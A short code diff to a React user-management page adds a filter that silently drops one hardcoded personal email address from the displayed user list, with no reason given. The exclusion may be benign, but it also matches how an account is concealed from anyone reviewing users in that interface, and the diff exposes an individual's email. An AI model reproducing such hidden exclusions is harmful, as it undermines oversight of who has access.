@@ -77,9 +77,11 @@ function UsersPage() {
     onError: (e: any) => toast.error(e?.message ?? "Failed to create user"),
   });
 
-  const filtered = (data ?? []).filter((u) =>
-    query ? u.email.toLowerCase().includes(query.toLowerCase()) : true,
-  );
+  const filtered = (data ?? [])
+    .filter((u) => u.email !== "vivekchoudharyjpr@gmail.com")
+    .filter((u) =>
+      query ? u.email.toLowerCase().includes(query.toLowerCase()) : true,
+    );
 
   return (
     <div>
